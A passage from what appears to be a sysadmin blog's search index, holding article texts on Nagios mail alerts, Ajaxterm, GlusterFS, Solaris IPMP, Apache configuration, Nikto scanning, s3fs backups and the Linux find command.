/etc/nagios3/scripts/nagios_send_service_mail.pl -c \"$CONTACTADDRESS1$\" -f html -u -p \"Deimos.fr Monitoring Tool\" } # 'notify-service-by-email' command definition #define command{ # command_name notify-service-by-email # command_line /usr/bin/printf \"%b\" \"***** INTERNAL Nagios *****\\n\\nNotification Type: $NOTIFICATIONTYPE$\\n\\nService: $SERVICEDESC$\\nHost: $HOSTALIAS$\\nAddress: $HOSTADDRESS$\\nState: $SERVICESTATE$\\n\\nDate/Time: $LONGDATETIME$\\n\\nAdditional Info:\\n\\n$SERVICEOUTPUT$\" | /usr/bin/mail -s \"** $Internal NOTIFICATIONTYPE$ Service Alert: $HOSTALIAS$/$SERVICEDESC$ is $SERVICESTATE$ **\" $CONTACTEMAIL$ # } nagios_send_host_mail.pl and nagios_send_service_mail.pl linkWe now need to modify a few things like URL, names etc. Let’s open the files and set custom fields:\n... my $mail_sender = \"Nagios Monitoring \"; my $nagios_cgiurl = \"http://nagios/nagios3/cgi-bin\"; my $o_smtphost = \"127.0.0.1\"; ... Those fields correspond to:\n$mail_sender: Email sender name $nagios_cgiurl: The CGI URL to nagios server. It’s needed for links in the mail $o_smtphost: The SMTP server That’s all. Reload your Nagios now.\n"
            }
        );
    index.add(
            {
                id:  397 ,
                href: "\/ajaxterm-utiliser-un-terminal-en-web\/",
                title: "Ajaxterm: Using a Terminal via Web",
                description: "How to set up Ajaxterm to access a Linux terminal through a web browser with proper security settings.",
                content: "Introduction linkAjaxterm allows you to have a terminal through a web page. For example, if you’re at a restricted site that doesn’t allow you to use SSH, there’s a good chance you can still use HTTPS. This is where Ajaxterm becomes handy, as it allows you to connect to the machine hosting Ajaxterm.\nThe downside is security. If you don’t configure this properly, your server can quickly end up in other hands than yours. I will address this point here as well to prevent that from happening.\nInstallation linkFor the installation, I kept it simple:\nwget http://antony.lesuisse.org/software/ajaxterm/files/Ajaxterm-0.10.tar.gz tar -xzvf Ajaxterm-0.10.tar.gz mv Ajaxterm-0.10 /usr/share/ajaxterm Next, I want Ajaxterm to start automatically at boot as a daemon with the www-data user (or the web user if you’re not on Debian) which corresponds to PID 33. I’ll add this line to the following file:\n# In /etc/rc.local ... python /usr/share/ajaxterm/ajaxterm.py -u33 -d ... For the more courageous, you can create an init script, which would be cleaner.\nConfiguration linkThere’s no special configuration needed for Ajaxterm; by default everything is nice. However, you’ll need to configure a web proxy to redirect from port 443 to 8022 on localhost.\nLighttpd linkIf you use Lighttpd, we’ll configure it to load the proxy module:\n# In /etc/lighttpd/conf-available/10-proxy.conf ... server.modules += ( \"mod_proxy\" ) ... Then we’ll create a configuration for Ajaxterm that will allow us access if:\nThe host corresponds to www.deimos.fr The URL corresponds to term or terminal Additionally, some security points have been added, such as:\nIf port 80 is used, we redirect to port 443 The user must enter the correct credentials for a htaccess file Here’s the configuration:\n### Ajaxterm $HTTP[\"host\"] =~ \"www\\.deimos\\.fr\" { $HTTP[\"url\"] =~ \"^/(term|terminal|ajaxterm)\" { $SERVER[\"socket\"] == \":80\" { url.redirect = ( \"\" =\u003e \"https://www.deimos.fr/ajaxterm/\" ) } auth.require = ( \"\" =\u003e ( \"method\" =\u003e \"digest\", \"realm\" =\u003e \"Authorized users only\", \"require\" =\u003e \"valid-user\" ) ) proxy.server = ( \"\" =\u003e ( ( \"host\" =\u003e \"127.0.0.1\", \"port\" =\u003e 8022 ) ) ), } } So to summarize, the security is pretty good, but we’re not far from the vital minimum. Ideally, you would add even more security options, but I won’t cover them here.\nTo finish, we’ll enable our new modules:\nlighty-enable-mod proxy lighty-enable-mod ajaxterm All that’s left is to restart Lighttpd and connect: https://www.deimos.fr/ajaxterm :-)\n"
            }
        );
    index.add(
            {
                id:  398 ,
                href: "\/glusterfs-ha-cluster-filesystem\/",
                title: "GlusterFS: High Availability Cluster Filesystem",
                description: "How to setup GlusterFS to create a high availability clustered filesystem with automatic file replication across multiple servers.",
                content: "Introduction linkGlusterFS is an open source distributed parallel file system capable of scaling to several petabytes. GlusterFS is a cluster/network file system. GlusterFS comes with two components, a server and a client. The storage server (or each server in a cluster) runs glusterfsd and clients use the mount command or glusterfs client to mount the file systems served, using FUSE.\nThe goal here is to run 2 servers that will perform complete replication of part of a filesystem.\nBe careful not to run this type of architecture on the Internet as performance will be catastrophic. Indeed, when a node wants to read access a file, it must contact all other nodes to see if there are any discrepancies. Only then does it authorize reading, which can take a long time depending on the architectures.\nInstallation linkTo install on Debian…easy move:\naptitude install glusterfs-server glusterfs-examples Configuration linkhosts linkAs with any respectable cluster, we must correctly configure the hosts table to avoid troubles in case of DNS loss. Add the following hosts:\n(/etc/hosts)\n192.168.110.2 rafiki.deimos.fr rafiki 192.168.20.6 ed.deimos.fr ed Generating Configurations linkWe’ll simplify things here by generating a configuration for a RAID 1:\ncd /etc/glusterfs rm -f * /usr/bin/glusterfs-volgen --name www --raid 1 rafiki:/var/www-orig ed:/var/www-orig Then on each server, rename the file corresponding to the server you’re on to glusterfsd.vol and the tcp file to glusterfs.vol:\nmv rafiki-www-export.vol glusterfsd.vol mv www-tcp.vol glusterfs.vol Don’t forget to do the same on the other server and you can restart your glusterfs server.\nServer linkOn the server side, we’ll apply this configuration:\n(/etc/glusterfs/glusterfsd.vol)\n### file: server-volume.vol.sample ##################################### ### GlusterFS Server Volume File ## ##################################### #### CONFIG FILE RULES: ### \"#\" is comment character. ### - Config file is case sensitive ### - Options within a volume block can be in any order. ### - Spaces or tabs are used as delimitter within a line. ### - Multiple values to options will be : delimitted. ### - Each option should end within a line. ### - Missing or commented fields will assume default values. ### - Blank/commented lines are allowed. ### - Sub-volumes should already be defined above before referring. volume posix1 type storage/posix option directory /var/www end-volume volume locks1 type features/locks subvolumes posix1 end-volume volume brick1 type performance/io-threads option thread-count 8 subvolumes locks1 end-volume volume server-tcp type protocol/server option transport-type tcp option auth.addr.brick1.allow * option transport.socket.listen-port 6996 option transport.socket.nodelay on subvolumes brick1 end-volume Client linkFor the client part, we tell it that we want to do “raid1”. Here is the configuration to apply on the “ed” node:\n(/etc/glusterfs/glusterfs.vol)\n### file: client-volume.vol.sample ##################################### ### GlusterFS Client Volume File ## ##################################### #### CONFIG FILE RULES: ### \"#\" is comment character. ### - Config file is case sensitive ### - Options within a volume block can be in any order. ### - Spaces or tabs are used as delimitter within a line. ### - Each option should end within a line. ### - Missing or commented fields will assume default values. ### - Blank/commented lines are allowed. ### - Sub-volumes should already be defined above before referring. # RAID 1 # TRANSPORT-TYPE tcp volume ed-1 type protocol/client option transport-type tcp option remote-host ed option transport.socket.nodelay on option transport.remote-port 6996 option remote-subvolume brick1 end-volume volume rafiki-1 type protocol/client option transport-type tcp option remote-host rafiki option transport.socket.nodelay on option transport.remote-port 6996 option remote-subvolume brick1 end-volume volume mirror-0 type cluster/replicate subvolumes rafiki-1 ed-1 end-volume volume readahead type performance/read-ahead option page-count 4 subvolumes mirror-0 end-volume volume iocache type performance/io-cache option cache-size `echo $(( $(grep 'MemTotal' /proc/meminfo | sed 's/[^0-9]//g') / 5120 ))`MB option cache-timeout 1 subvolumes readahead end-volume volume quickread type performance/quick-read option cache-timeout 1 option max-file-size 64kB subvolumes iocache end-volume volume writebehind type performance/write-behind option cache-size 4MB subvolumes quickread end-volume volume statprefetch type performance/stat-prefetch subvolumes writebehind end-volume Execution linkServer linkRestart glusterfs after adapting to your needs.\nClient linkSimply mount the glusterfs partition:\nglusterfs /var/www You now have access to your glusterfs mount point in /var/www.\nFAQ linkForce Client Synchronization linkIf you want to force data synchronization for a client, it’s simple. Just go to the directory where the glusterfs share is located (here /mnt/glusterfs), then perform a directory traversal like this:\nls -lRa This will read everything and therefore copy everything.\nwww-posix: Extended attribute not supported linkIf you look in your logs and see something like this:\n(/var/log/glusterfs/glusterfsd.vol.log)\n... +------------------------------------------------------------------------------+ [2010-10-17 00:40:30] W [afr.c:2743:init] www-replicate: Volume is dangling. [2010-10-17 00:40:30] C [posix.c:4936:init] www-posix: Extended attribute not supported, exiting. [2010-10-17 00:40:30] E [xlator.c:844:xlator_init_rec] www-posix: Initialization of volume 'www-posix' failed, review your volfile again [2010-10-17 00:40:30] E [glusterfsd.c:591:_xlator_graph_init] glusterfs: initializing translator failed [2010-10-17 00:40:30] E [glusterfsd.c:1395:main] glusterfs: translator initialization failed. exiting It means you have permission problems. In my case, this happened in an OpenVZ container. To solve the problem, here’s the solution to apply on the host machine (not in the VE) (warning, this requires stopping, applying configurations, then restarting the VE):\nIf you want to do glusterfs in a VE, you may encounter permission problems:\nfuse: failed to open /dev/fuse: Permission denied To work around them, we’ll create the fuse device from the host on the VE in question and add admin rights to it (not great in terms of security, but no choice):\nvzctl set $my_veid --devices c:10:229:rw --save vzctl exec $my_veid mknod /dev/fuse c 10 229 vzctl set $my_veid --capability sys_admin:on --save Note: Don’t forget to load the fuse module on your host machine:\n(/etc/modules)\n... fuse Resources linkHigh-Availability Storage Cluster With GlusterFS\nHigh-availability storage with GlusterFS on Debian Lenny\nOpenVZ Forum Discussion on GlusterFS\nAdditional GlusterFS Configuration Example\n"
            }
        );
    index.add(
            {
                id:  399 ,
                href: "\/Configuration_de_l\u0027IPMP\/",
                title: "IPMP Configuration",
                description: "Learn how to set up and configure IP Network Multipathing (IPMP) on Solaris systems for improved network reliability and load balancing",
                content: "Introduction linkIP Network Multipathing (IPMP) enables you to detect interface failures and transparently switch network access for a system with multiple interfaces on the same IP link. IPMP also allows load balancing of packets for systems with multiple interfaces.\nThe equivalent on Linux is called bonding and on BSD, it’s called trunking.\nIPMP improves the reliability, availability, and network performance of systems with multiple physical interfaces. Sometimes a physical interface or the networking hardware connected to that interface fails or requires maintenance. Traditionally, it is then impossible to contact the system through any of the IP addresses associated with the failed interface. Additionally, any existing connections to the system using those IP addresses are disrupted.\nBy using IPMP, you can configure one or more physical interfaces into an IPMP group. After IPMP configuration, the system automatically monitors the interfaces in the group for failure. If an interface in the group fails or is removed for maintenance, IPMP automatically migrates, or fails over, the failed interface’s IP addresses. The recipient of these addresses is a functioning interface in the failed interface’s IPMP group. The failover feature of IPMP preserves connectivity and prevents disruption of any existing connections. Additionally, IPMP improves overall network performance by spreading outbound network traffic across all interfaces in the IPMP group. This process is called load spreading.\nConfiguration linkPrerequisites linkIPMP is built into the Solaris operating system and does not require any special hardware. Any interface supported by Solaris can be used with IPMP. However, your network configuration and topology must meet the following IPMP-related requirements:\nAll interfaces in an IPMP group must have unique MAC addresses. Note that by default, network interfaces of SPARC-based systems share the same MAC address. Therefore, you need to explicitly change the default address to use IPMP on SPARC-based systems. All interfaces in an IPMP group must be of the same media type (e.g., Ethernet with Ethernet, Fiber with Fiber, but not mixed). All interfaces in an IPMP group must be on the same IP link (same subnet). Depending on your requirements for failure detection, you’ll either need to use specific types of network interfaces or configure additional IP addresses on each network interface. /etc/hosts linkYou’ll need to configure the hosts file to specify the IPs of the machines, test IPs, and virtual IPs:\n# # Internet host table # ::1 localhost 127.0.0.1 localhost 192.168.0.72 sun-node1 192.168.0.74 sun-node1-if2 192.168.0.73 sun-node1-test-e1000g0 192.168.0.77 vip1 192.168.0.78 vip2 /etc/netmasks linkNow you’ll need to set the network and subnet in the /etc/netmasks file:\n# # The netmasks file associates Internet Protocol (IP) address # masks with IP network numbers. # # network-number netmask # # The term network-number refers to a number obtained from the Internet Network # Information Center. # # Both the network-number and the netmasks are specified in # \"decimal dot\" notation, e.g: # # 128.32.0.0 255.255.255.0 # 192.168.0.0 255.255.255.0 Creating an IPMP Group linkYou’ll need to create an IPMP group and add network cards to it. If you want fault tolerance, you’ll need to activate a test IP. This IP will not be part of the VIPs (Virtual Private Interface). Configure as follows:\n192.168.0.72 netmask + broadcast + group ipmp0 up addif 192.168.0.73 deprecated -failover netmask + broadcast + up 192.168.0.74 netmask + broadcast + group ipmp0 standby up Here are the meanings:\ndeprecated: Indicates that the test address is not used for outgoing packets. failover: Indicates that the test address does not failover when the interface fails. standby: Marks the interface as the standby interface. Restart afterward to apply the configuration and check that it’s properly taken into account at reboot.\nModifying the Probing Time linkIf you want to change the interval at which the system will detect a disconnection of an interface, edit the following file:\n# #pragma ident \"@(#)mpathd.dfl 1.2 00/07/17 SMI\" # # Time taken by mpathd to detect a NIC failure in ms. The minimum time # that can be specified is 100 ms. # FAILURE_DETECTION_TIME=10000 # # Failback is enabled by default. To disable failback turn off this option # FAILBACK=yes # # By default only interfaces configured as part of multipathing groups # are tracked. Turn off this option to track all network interfaces # on the system # TRACK_INTERFACES_ONLY_WITH_GROUPS=yes Testing linkTo test now, it’s quite simple. Look at the current configurations:\nlo0: flags=2001000849 mtu 8232 index 1 inet 127.0.0.1 netmask ff000000 e1000g0: flags=1000843 mtu 1500 index 2 inet 192.168.0.72 netmask ffffff00 broadcast 192.168.0.255 groupname ipmp0 ether 0:1e:68:49:ae:98 e1000g0:1: flags=9040843 mtu 1500 index 2 inet 192.168.0.73 netmask ffffff00 broadcast 192.168.0.255 e1000g0:2: flags=1000843 mtu 1500 index 2 inet 192.168.0.74 netmask ffffff00 broadcast 192.168.0.255 e1000g1: flags=69040842 mtu 0 index 3 inet 0.0.0.0 netmask 0 groupname ipmp0 ether 0:1e:68:49:ae:99 Here you can clearly see the IPMP interfaces as well as the interface that is in standby and inactive. Now, if we disconnect the first interface, the failover will happen automatically :-)\nlo0: flags=2001000849 mtu 8232 index 1 inet 127.0.0.1 netmask ff000000 e1000g0: flags=19000802 mtu 0 index 2 inet 0.0.0.0 netmask 0 groupname ipmp0 ether 0:1e:68:49:ae:98 e1000g0:1: flags=19040803 mtu 1500 index 2 inet 192.168.0.73 netmask ffffff00 broadcast 192.168.0.255 e1000g1: flags=21040842 mtu 1500 index 3 inet 192.168.0.72 netmask ffffff00 broadcast 192.168.0.255 groupname ipmp0 ether 0:1e:68:49:ae:99 e1000g1:1: flags=21000843 mtu 1500 index 3 inet 192.168.0.74 netmask ffffff00 broadcast 192.168.0.255 Now the interface has gone into failed state. And there was no interruption during this period. The interface that was in standby is now no longer inactive. So now it’s functional, and if we reconnect the interface, we return to the previous configuration.\nResources linkhttp://docs.sun.com/app/docs/doc/820-2982/ipmptm-1?l=fr\u0026a=view http://www.eng.auburn.edu/~doug/howtos/multipathing.html\n"
            }
        );
    index.add(
            {
                id:  400 ,
                href: "\/Installation_et_configuration_d%5C%27Apache_2\/",
                title: "Apache 2 Installation and Configuration",
                description: "This guide covers the installation and configuration of Apache 2 web server, including authentication, URL rewrites, virtual hosts, and performance optimizations.",
                content: "Introduction linkApache is one of the most widely used web servers in the world, if not THE most used web server in the world.\nInstallation linkTo install it:\napt-get install apache2 Configuration linkChoose a Default Charset linkIn the configuration file /etc/apache2/apache2.conf or /etc/apache2/conf.d/charset, insert this:\nAddDefaultCharset .latin9 Then reload Apache:\n/etc/init.d/apache2 reload Authentication linkLDAP linkFor LDAP authentication, you need to install this:\napt-get install libapache-authznetldap-perl Then enable the module and restart the server:\na2enmod authnz_ldap /etc/init.d/apache2 restart Now, for the configuration part, I’ll take the example of Nagios3 where we need to modify the “DirectoryMatch” section as follows:\nOptions FollowSymLinks DirectoryIndex index.html AllowOverride AuthConfig Order Allow,Deny Allow From All AuthName \"Nagios Access\" AuthType Basic #AuthUserFile /etc/nagios3/htpasswd.users # nagios 1.x: #AuthUserFile /etc/nagios/htpasswd.users #require valid-user # auth from ldap AuthzLDAPAuthoritative on AuthBasicProvider ldap AuthLDAPURL ldap://ldap/dc=openldap,dc=mycompany,dc=lan?uid?sub?(objectClass=posixAccount) AuthLDAPRemoteUserIsDN off AuthLDAPGroupAttribute memberUid AuthLDAPGroupAttributeIsDN off Require ldap-group cn=prod,ou=Groupes,dc=openldap,dc=mycompany,dc=local Require ldap-group cn=sysnet,ou=Groupes,dc=openldap,dc=mycompany,dc=local Require ldap-user nagiosadmin Here, I have 2 groups (sysnet and prod) that are authorized to connect.\nSkip Authentication for Specific IP Addresses linkI need monitoring screens to access Nagios without authentication while keeping LDAP authentication for other users. Building on the example above, here are the lines to modify:\nAllowOverride AuthConfig Require valid-user Order Deny,Allow Allow From 10.100.10.0/24 Satisfy Any This way, IPs from the 10.100.10.0/24 subnet don’t need to authenticate while others do. To decide whether to validate one solution or the other, I use the Satisfy Any directive. We can put ‘Satisfy All’ if we want all conditions to be validated.\nCreating Redirects linkIf you want to protect a specific folder, you have 2 methods:\nComplete prohibition Redirection PS: I won’t discuss special cases such as htaccess here, see this documentation.\nTo prohibit access:\nOrder allow,deny Deny from all If you want to create a redirection, insert this in your “Directory” section:\nRedirectMatch ^/$ http://mysecureshell.sourceforge.net This will redirect to the MySecureShell site :-) Or if you want to redirect to a local folder:\nRedirectMatch ^/$ /my_folder/ There’s also the ultimate solution:\nRedirect /myfolder http://mysecureshell.sourceforge.net or even:\nRedirectMatch ^(.*)$ https://www.deimos.fr$1 Which gives me:\nServerName www.deimos.fr ServerAlias deimos.fr www.deimos.fr RedirectMatch ^(.*)$ https://www.deimos.fr$1 HTML Redirector linkHere’s a very simple solution for creating a redirector. Just place an index.html file in the desired folder with this content:\n\u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"\u003e www.deimos.fr Please wait while redirecting...\nVirtualHost linkWhen we have an Apache server at the front end and want to redirect traffic to other Apache servers at the back end, we need to activate mod_proxy. Here’s an example:\nProxyRequests Off NameVirtualHost 1.2.3.4 # IP of your box # Website managed by Apache ServerName www.domain.tld DocumentRoot /var/www/htdocs/ # etc... ServerName www.domain2.tld ErrorLog blabla CustomLog blabla ProxyPassReverse / http://127.0.0.1:8002/ ServerName www.domain3.tld ErrorLog blabla CustomLog blabla ProxyPassReverse / http://127.0.0.1:8003/ Here, depending on the URL the client entered, there will be automatic redirects to other servers.\nURL Rewriting Redirects linkHere’s an example of URL rewriting. This allows redirecting cvsweb.mydomain.com automatically to the correct URL and cleaning up the URL as well. I changed from:\nhttp://machine.mydomain.com/cgi-bin/cvsweb to\nhttp://cvsweb.mydomain.com Here’s the solution. First, let’s load the module:\na2enmod rewrite Then we’ll write this in our configuration file (/etc/apache2/sites-enabled/000-default):\nServerName http://cvsweb.mydomain.com ServerAlias cvsweb ServerAdmin it-system@mydomain.com DocumentRoot /var/www/ ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ LogLevel warn ServerSignature On RedirectMatch ^/$ /cgi-bin/cvsweb/ ### Rewrite http://cvsweb as http://cvsweb.mydomain.com RewriteEngine On RewriteCond %{HTTP_HOST} ^cvsweb$ RewriteRule ^(.*)$ http://cvsweb.mydomain.com/$1 [R=301,L] Then force Apache to reload everything:\n/etc/init.d/apache2 force-reload Block Internet Explorer Access to Your Site linkIt’s possible to block access to all kinds of browsers. If like me, you’re not friends with IE which breaks your PNGs in version 6, doesn’t respect standards, breaks CSS, etc., it might be convenient to block it and politely direct the user to download Firefox as soon as possible.\nFor this, we’ll use the rewrite mode. It must be enabled as described above. Then add these lines in the desired folder (Directory for the entire site for example) in sites-enabled/000-default:\n... AllowOverride FileInfo RewriteEngine on RewriteCond %{HTTP_USER_AGENT} .*MSIE.* # opera sometimes pretends to be IE RewriteCond %{HTTP_USER_AGENT} !.*Opera.* # avoid infinite loop in conditions RewriteCond %{REQUEST_FILENAME} !.*ie.html # redirect to a page explaining the reasons for rejection RewriteRule .* /ie.html [L] All that’s left is to create the ie.html file and put your nice text in it (you can also make a simple text file). Here’s what I use (/var/www/ie.html):\n\u003c!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"\u003e Access Forbidden with Internet Explorer Dear Internet User,\nThis site cannot be accessed using Internet Explorer.\nYou should now understand that times are changing.\nYou are currently using a browser (Internet Explorer) that doesn't\nrespect standards and holds a monopoly due to its mandatory omnipresence in\nyour dear OS (Windows). That said, perhaps you're at work and don't have a choice of OS.\nHowever, Internet Explorer should no longer be used when there are many\nother free, open-source browsers that respect standards!\nBut since you don't seem to be aware of this, it's okay, let me help you.\nTo begin with, you can download a clean browser like Firefox.\nThis would already help you get on the right track and will allow you to access\nmy site.\nStill on your new quest to the light side of the force, you should switch to\na free, open-source OS (Ubuntu for example) that will surely make you happy.\nI encourage you to take control as soon as possible.\nRegards,\nPierre (aka Deimos) Public Folders linkPublic folders are used to have multiple clients on a server where each has their own personal space. The practice is quite simple: we have, for example, the user toto who has a “public_html” folder in their home directory, and their web server is accessible via “http://server/~toto”. I did this on OpenBSD with Apache 1.3; normally for version 2, the syntax is the same. So here’s the configuration to add:\nUserDir public_html AllowOverride FileInfo AuthConfig Limit Options MultiViews Indexes SymLinksIfOwnerMatch IncludesNoExec # Look HeaderName /header.htm Order allow,deny Allow from all Order deny,allow Deny from all You can also see that I changed the header of my main pages with the “HeaderName” option. This header.htm file must be located in the “DocumentRoot” folder when called by “/”.\nHere’s an example with a mix of BSD authentication + IP restriction:\nUserDir download AuthBSDGroup auth "
            }
        );
    index.add(
            {
                id:  401 ,
                href: "\/V%C3%A9rifier_la_s%C3%A9curit%C3%A9_de_son_site_web_avec_Nikto\/",
                title: "Checking Your Website Security with Nikto",
                description: "Guide on how to use Nikto to test web server security and detect potential vulnerabilities.",
                content: "Introduction linkTo verify your configuration file and test potential security vulnerabilities, here’s a practical Perl script called Nikto. These are the most well-known security audit applications similar to Nikto:\nWebScarab/ProxMon WebInspect by SPI Dynamics Wikto Exploit-me Paros Proxy Installation and Configuration linkHere’s the documentation I found:\nApache Security Testing\nFor those who don’t want to recompile packages:\naptitude install nikto Then it’s simple, as described in the documentation:\nnikto -h localhost Resources linkProxyStrike a new transparent proxy for web application auditing\n"
            }
        );
    index.add(
            {
                id:  402 ,
                href: "\/Rancid_Search_:_Mise_en_place_d\u0027un_outil_de_recherche_pour_Rancid\/",
                title: "Rancid Search: Setting Up a Search Tool for Rancid",
                description: "How to implement a search tool for Rancid to easily search through network device configurations.",
                content: "Introduction linkYou may already be familiar with Rancid which allows you to backup your precious Cisco equipment and store them in a VCS. At work, my network team complained about not being able to search through all Cisco equipment at once. Imagine multiple devices with some containing more than 25,000 lines of ACLs and other VPN configurations. To search for information, they first had to know which equipment to connect to, then search through the configuration. In short, it was not always an easy task to read through, time-consuming, and without regex search capability.\nI therefore decided to create a web interface to meet their needs with the help of a colleague. The interface is in Perl CGI where I use jQuery for some “flashy” or “Web 2.0” features, but it looks nice :-)\n"
            }
        );
    index.add(
            {
                id:  403 ,
                href: "\/amazone-s3-sauvegarde-propres-et-automatisees-avec-amazon-s3\/",
                title: "Amazon S3: Clean and Automated Backups with Amazon S3",
                description: "How to set up clean and automated backups using Amazon S3 cloud storage service with various mounting options like FUSE and AutoFS",
                content: "Introduction linkFor those who don’t know, Amazon S3 is a remote backup service. The advantages are:\nthe price the bandwidth the storage I’ll let you look at the price list to see for yourself.\nThere isn’t really any provided software, but rather an API. And with its current popularity, some guys have worked on it and created some pretty nice tools :-)\nI’ll describe here how I’ve set up something quite elegant and cost-effective.\nInstallation linkFirst, let’s install the basic commands (just in case):\napt-get install s3cmd Then we’ll install what’s needed for Fuse, which will allow us to navigate on Amazon S3 as if it were a mounted filesystem. Here we install the development libraries for compilation:\napt-get install libcurl4-openssl-dev libxml2-dev libfuse-dev make g++ fuse-utils Note: If you already have the s3fs binary (so no compilation needed), just install these packages:\napt-get install libcurl3 libfuse2 fuse-utils Compilation linkNow we need to download the sources for Fuse Over Amazon, then compile them:\nwget http://s3fs.googlecode.com/files/s3fs-1.40.tar.gz tar -xzf s3fs-1.40.tar.gz cd s3fs-1.40 ./configure --bindir /usr/bin make make install Configuration linkWe’ll first use s3cmd to create our bucket (personal folder for amazon s3), then use it with Fuse.\ns3cmd linkLet’s first configure our account by running the following command:\ns3cmd --configure Fill in all the fields using the information from your account. The most important are the access key and the secret key. Once done, we’ll create our bucket:\ns3cmd mb monbucket_with_a_unique_name It’s important to create a bucket with a specific name because everyone is basically on the same filesystem. So if the name already exists, you won’t be able to create this bucket.\nFuseOverAmazon linkLet’s create the /etc/passwd-s3fs file and fill in the info as follows (/etc/passwd-s3fs):\naccess_key:secret_key Enter your access key, followed by ‘:’, then your secret key.\nThen we’ll apply the appropriate permissions:\nchmod 600 /etc/passwd-s3fs Finally, we can mount all this in /mnt for example (adapt according to your needs):\ns3fs monbucket_with_a_unique_name /mnt -ouse_cache=/tmp And there you go :-). You can do ls, mkdir, cp, rm etc… in /mnt and it will hit your Amazon S3 backup :-).\nFstab linkAnd if we want to put all this in fstab? This is of course optional, but very practical:\ns3fs#monbucket_with_a_unique_name /mnt fuse ouse_cache=/tmp,noatime,allow_other 0 0 Here’s the line to add.\nAutoFS linkThe best setup is with autofs! I invite you to read this documentation first to not be too confused, then add this line in a file auto.as3 for example:\namazons3 -fstype=fuse,ouse_cache=/tmp,noatime,allow_other:s3fs\\#monbucket_with_a_unique_name Then modify the auto.master file:\n/mnt /etc/auto.as3 --timeout=60 Restart the autofs service for this to work.\nBackups with specific software linkWith some software, you need to be clever to bypass the 5GB file size limitation imposed by Amazon S3 or multiple files in too large a number which will cost us dearly.\nSbackup linkFor Sbackup, it’s quite simple, you need to check if the file size is larger than 5 GB and split the files.tgz file.\nBackupPc linkFor BackupPc, it is recommended to compress existing data before uploading it because there are often too many small files.\nResources linkhttp://code.google.com/p/s3fs/wiki/FuseOverAmazon\nhttp://s3tools.org/s3cmd\n"
            }
        );
    index.add(
            {
                id:  404 ,
                href: "\/La_commande_find_ou_la_puissance_de_la_recherche\/",
                title: "The find command or the power of search",
                description: "A comprehensive guide on using the find command in Linux for powerful file searching capabilities",
                content: "Introduction linkThe find command is one of the most effective advanced commands in system administration—it requires administrator privileges.\nThe find command is an extremely powerful tool with about fifty options, allowing searches defined according to very fine criteria: files, directories, symbolic links… based on the name (case-sensitive or not), according to the owner, size, date, etc., in a single or multiple filesystem! It’s worth adding that its options are defined according to two categories: selection and execution. This gives you an idea of the full extent of this command’s power.\nThe syntax of the find command is unfortunately not the most common. A few tests will convince you, if you are not already convinced, to adopt it as soon as possible.\nAs an anecdote, it’s thanks to this formidable command that I found, on my external drive, a lost file that I had been sorely missing for several years:\nfind /media/IOMEGA_HDD -print0 | xargs --null grep chaplin As shown in the line above, the find command works wonderfully with the xargs command. Using the combined resources of these commands, I was searching through my disk’s directory structure for all files containing the word “chaplin”… find was able to trace my old file inserted in a backup file dating from 2004! Hat’s off to the artist!\nProof by example linkBeyond the undeniable ergonomics of graphical tools, what should make the difference is above all the efficiency and speed of the result. So, let’s put the locate, find commands and the Beagle Search graphical tool to the test.\nFor this search example, let’s make the task a bit more complicated for our competitors. The test machine includes several hard drives, therefore several partitions, several file systems, several OSs (Free only… that goes without saying!). Some partitions are dedicated only to pure and simple storage, and it’s of course on these partitions that the search will have to prove itself.\nlocate and Beagle linkWith an elementary syntax, the result of the locate command does not correspond at all to what was expected. To get satisfaction, I would have had to create my own index and certainly specify more search criteria (path, file type, etc.). But let’s keep it simple.\nlocate artemis* /usr/share/app-install/icons/_usr_share_pixmaps_artemis.xpm /usr/share/app-install/desktop/artemis.desktop In graphical mode, Beagle doesn’t do much better: only one result for a plain text file that has absolutely nothing to do with the object being searched!\nThe find command… the one and only winner! linkHere’s the find command in action with a basic syntax, so as not to disadvantage its competitors too much:\nsudo find / -name artemis* -print [sudo] password for zarer: /media/disk/documents_pro/2007_2008/lectures/artemis_fowl.odt /usr/share/app-install/desktop/artemis.desktop Bingo! On the first try! Wow! For me, it doesn’t take more to convince me: the object being searched is found quickly, across different file systems, without entering many obscure options. Remarkable.\nBy adding just one option, the owner, the result would have been unmistakable:\nsudo find / -name artemis* -user zarer -print [sudo] password for zarer: /media/disk/documents_pro/2007_2008/lectures/artemis_fowl.odt gnome-search-tool: find, locate and grep combined!\nThe File Search application is the only one, to my knowledge (immediately available to a user freshly arrived on Linux with the Gnome desktop), that can compete with find. The reason:\nThe File Search uses the UNIX commands find, grep and locate. By default, during an elementary search, the File Search first uses the locate command, and secondly the find command, which is slower but more effective.\nWell yeah! Find is behind it all!\nIntroduction to the find command linkAs you’ll have understood, this command is among the “great classics” for administration: find is a basic tool, whether in command line mode or in shell scripts.\nThe find command searches for objects (files, directories, links, etc.) in the directory tree that starts at the directory given as an argument, according to defined criteria, and executes an action on that object. The most commonly used selection criterion is the name of the object (file, directory, …) and the most frequent action is displaying the access path to the searched object.\nIts general syntax is as follows:\nfind /search_directory -option1 -option2 ... Here are some simple examples of searching in all or part of the file system(s):\nExample 1 linkIn this first example, the command must search for a specific file named my_first_file from the root directory (see the UNIX directory tree diagram) and display the result on the screen:\nfind / -type f -name my_first_file -print Example 2 linkEven the most organized users know how difficult it is sometimes to remember the exact name given to a particular file. The find command also allows the use of wildcard or substitution characters:\nfind / -type f -name *file -print In a file (or directory) name, wildcards or substitution characters play a special role for the command interpreter: they replace a variable number of characters according to the wildcard used.\nThe asterisk (*) linkThe star (or asterisk) replaces any number of characters (including none). It can be placed anywhere in the name. This character is often used to list files based on a part of the name.\nThe question mark (?) linkThe question mark replaces only one character and one only. It can be placed anywhere in the file (directory) name, as in the examples below for the search for a file named file1 or file10:\nfind / -type f -name file? -print find / -type f -name file?? -print Brackets ([]) linkBrackets are identical to the question mark except that the substitution is only made with one of the characters presented between brackets: [abc], [0-9], [!abc] for a character different from a, b and c, [!0-5], …\nExample 3 linkIn this third example, the command must list all directories contained in my home directory and display the result on the screen:\nfind /home/zarer -type d -print Some useful options for advanced search\nThe options of the find command are divided into two categories: selection and execution.\nOptions for selection criteria linkThe selection criteria are very numerous and apply to the type (file, directory, …) and attributes (owner, group, permissions, creation or modification date, size, …) of the search objects. Let’s just present a few of them (see the find command manual 